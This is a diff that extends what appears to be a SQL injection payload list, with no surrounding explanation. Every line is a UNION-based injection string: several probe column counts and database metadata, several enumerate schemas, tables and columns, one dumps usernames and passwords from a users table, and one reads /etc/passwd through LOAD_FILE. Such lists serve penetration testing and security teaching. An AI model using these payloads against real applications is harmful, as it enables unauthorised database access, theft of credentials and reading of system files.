@@ -5,8 +5,24 @@ Payloads :~
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
 ' UNION SELECT 1,@@version--
 ' UNION SELECT 1,user()--
 ' UNION SELECT database(),version()--
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username,password FROM users--
+' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables--
+' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+' UNION SELECT 1,@@hostname--
+' UNION SELECT 1,current_user()--
+' UNION SELECT 1,database()--
+' UNION SELECT 1,SCHEMA_NAME FROM information_schema.schemata--
+' UNION SELECT 1,TABLE_NAME FROM information_schema.tables--
+' UNION SELECT 1,COLUMN_NAME FROM information_schema.columns--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT version(),user()--
+' UNION SELECT NULL,CONCAT(user(),0x3a,database())--
+' UNION ALL SELECT NULL,NULL--
